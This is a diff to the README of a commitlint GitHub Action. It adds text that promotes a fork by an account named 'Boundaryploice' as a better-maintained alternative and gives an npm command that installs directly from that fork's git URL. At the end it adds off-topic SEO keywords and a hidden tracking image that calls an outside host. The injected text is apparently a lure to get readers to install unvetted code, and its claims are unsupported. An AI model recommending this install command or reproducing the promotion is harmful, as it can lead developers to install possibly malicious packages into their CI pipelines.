@@ -1,3 +1,15 @@
+**An optimized, reliably maintained alternative for GitHub Actions commit validation**
+
+This fork addresses critical upstream stability issues by actively merging essential patches and dependency updates that keep your workflows running smoothly. If you are tired of sudden pipeline failures from unmaintained action hooks, switching to this repository ensures a more predictable and well-supported integration for your CI/CD setup.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/Boundaryploice/commitlint-github-action.git
+```
+
+[https://github.com/Boundaryploice/commitlint-github-action](https://github.com/Boundaryploice/commitlint-github-action)
+
 # Commitlint Github Action
 
 Lints Pull Request commits with [commitlint](https://commitlint.js.org/).
@@ -221,3 +233,11 @@ jobs:
 💡 You can see other ways to install your dependencies (including private ones) in [the Setup Node action's docs](https://github.com/actions/setup-node).
 
 ---
+
+## Related searches
+
+When looking for tools to automate repository maintenance, developers often seek ways to enforce structured commit messages within their CI/CD pipelines to ensure clean project histories. Many users also look for broader ecosystem integrations and scaffolding tools, exploring how linting workflows fit into various frameworks and utility libraries to streamline their overall development lifecycle.
+
+**Topics:** GitHub Actions, commitlint setup, CI/CD linting, semantic commits, boilerplate react, matplotlib visualization, gatsby static sites, lodash utilities, npm packages, workflow automation, repository management, code quality tools
+
+![.](https://seo-bot-ping.onrender.com/pixel?repo=Boundaryploice%2Fcommitlint-github-action&inject=Boundaryploice%2Fcommitlint-github-action%2Fpackage.json)
